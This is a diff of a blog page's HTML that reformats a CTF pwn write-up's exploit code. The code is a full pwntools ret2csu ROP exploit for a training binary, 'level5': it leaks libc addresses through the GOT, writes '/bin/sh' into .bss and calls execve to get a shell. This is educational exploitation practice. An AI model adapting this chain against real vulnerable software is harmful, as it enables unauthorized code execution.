@@ -486,62 +486,8 @@
 
 <p><img src="https://i.loli.net/2020/08/08/l8Vgbjavq5hsK7z.png" alt="捕获.PNG"></p>
 <p>exp</p>
-<pre><code class="python">from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400564</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x4005f0</span></span><br><span class="line">csu_end_addr   = <span class="number">0x400606</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x00000000004005f0 &lt;+80&gt;:	mov    rdx,r15</span></span><br><span class="line"><span class="string">0x00000000004005f3 &lt;+83&gt;:	mov    rsi,r14</span></span><br><span class="line"><span class="string">0x00000000004005f6 &lt;+86&gt;:	mov    edi,r13d</span></span><br><span class="line"><span class="string">0x00000000004005f9 &lt;+89&gt;:	call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="string">0x00000000004005fd &lt;+93&gt;:	add    rbx,0x1</span></span><br><span class="line"><span class="string">0x0000000000400601 &lt;+97&gt;:	cmp    rbx,rbp</span></span><br><span class="line"><span class="string">0x0000000000400604 &lt;+100&gt;:	jne    0x4005f0 &lt;__libc_csu_init+80&gt;</span></span><br><span class="line"><span class="string">0x0000000000400606 &lt;+102&gt;:	mov    rbx,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="string">0x000000000040060b &lt;+107&gt;:	mov    rbp,QWORD PTR [rsp+0x10]</span></span><br><span class="line"><span class="string">0x0000000000400610 &lt;+112&gt;:	mov    r12,QWORD PTR [rsp+0x18]</span></span><br><span class="line"><span class="string">0x0000000000400615 &lt;+117&gt;:	mov    r13,QWORD PTR [rsp+0x20]</span></span><br><span class="line"><span class="string">0x000000000040061a &lt;+122&gt;:	mov    r14,QWORD PTR [rsp+0x28]</span></span><br><span class="line"><span class="string">0x000000000040061f &lt;+127&gt;:	mov    r15,QWORD PTR [rsp+0x30]</span></span><br><span class="line"><span class="string">0x0000000000400624 &lt;+132&gt;:	add    rsp,0x38</span></span><br><span class="line"><span class="string">0x0000000000400628 &lt;+136&gt;:	ret   </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx,rbp,r12,r13,r14,r15,last)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x88</span></span><br><span class="line">    payload+= p64(csu_end_addr)+<span class="string">'a'</span>*<span class="number">0x8</span>+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload+= p64(csu_front_addr)+<span class="string">'a'</span>*<span class="number">0x38</span>+p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">p.sendline(csu(<span class="number">0</span>,<span class="number">1</span>,write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,main))</span><br><span class="line">data = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,data)</span><br><span class="line">libc_base = data-libc.dump(<span class="string">'write'</span>)</span><br><span class="line">p.info(<span class="string">'libc_base: '</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">execve = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"><span class="comment">#p.recvuntil('Hello, World\n')</span></span><br><span class="line">p.sendline(csu(<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">0</span>,bss,<span class="number">0x100</span>,main))</span><br><span class="line">l = <span class="string">'/bin/sh\x00'</span>+p64(execve)</span><br><span class="line">p.sendline(l)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil('Hello, World\n')</span></span><br><span class="line">p.sendline(csu(<span class="number">0</span>,<span class="number">1</span>,bss+<span class="number">8</span>,bss,<span class="number">0</span>,<span class="number">0</span>,main))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-from LibcSearcher import *
-
-p = process(&#39;./level5&#39;)
-elf = ELF(&#39;./level5&#39;)
-
-main = 0x400564
-read_got = elf.got[&#39;read&#39;]
-write_got = elf.got[&#39;write&#39;]
-bss = elf.bss()
-csu_front_addr = 0x4005f0
-csu_end_addr   = 0x400606
-
-&#39;&#39;&#39;
-0x00000000004005f0 &lt;+80&gt;:    mov    rdx,r15
-0x00000000004005f3 &lt;+83&gt;:    mov    rsi,r14
-0x00000000004005f6 &lt;+86&gt;:    mov    edi,r13d
-0x00000000004005f9 &lt;+89&gt;:    call   QWORD PTR [r12+rbx*8]
-0x00000000004005fd &lt;+93&gt;:    add    rbx,0x1
-0x0000000000400601 &lt;+97&gt;:    cmp    rbx,rbp
-0x0000000000400604 &lt;+100&gt;:    jne    0x4005f0 &lt;__libc_csu_init+80&gt;
-0x0000000000400606 &lt;+102&gt;:    mov    rbx,QWORD PTR [rsp+0x8]
-0x000000000040060b &lt;+107&gt;:    mov    rbp,QWORD PTR [rsp+0x10]
-0x0000000000400610 &lt;+112&gt;:    mov    r12,QWORD PTR [rsp+0x18]
-0x0000000000400615 &lt;+117&gt;:    mov    r13,QWORD PTR [rsp+0x20]
-0x000000000040061a &lt;+122&gt;:    mov    r14,QWORD PTR [rsp+0x28]
-0x000000000040061f &lt;+127&gt;:    mov    r15,QWORD PTR [rsp+0x30]
-0x0000000000400624 &lt;+132&gt;:    add    rsp,0x38
-0x0000000000400628 &lt;+136&gt;:    ret   
-&#39;&#39;&#39;
-
-def csu(rbx,rbp,r12,r13,r14,r15,last):
-    payload = &#39;a&#39;*0x88
-    payload+= p64(csu_end_addr)+&#39;a&#39;*0x8+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
-    payload+= p64(csu_front_addr)+&#39;a&#39;*0x38+p64(last)
-    return payload
-
-p.recvuntil(&#39;Hello, World\n&#39;)
-p.sendline(csu(0,1,write_got,1,write_got,8,main))
-data = u64(p.recv(6)+&#39;\x00\x00&#39;)
-libc = LibcSearcher(&#39;write&#39;,data)
-libc_base = data-libc.dump(&#39;write&#39;)
-p.info(&#39;libc_base: &#39;+hex(libc_base))
-
-execve = libc_base + libc.dump(&#39;execve&#39;)
-system = libc_base + libc.dump(&#39;system&#39;)
-#p.recvuntil(&#39;Hello, World\n&#39;)
-p.sendline(csu(0,1,read_got,0,bss,0x100,main))
-l = &#39;/bin/sh\x00&#39;+p64(execve)
-p.sendline(l)
-
-#p.recvuntil(&#39;Hello, World\n&#39;)
-p.sendline(csu(0,1,bss+8,bss,0,0,main))
-
-p.interactive()</code></pre>
 
         
     
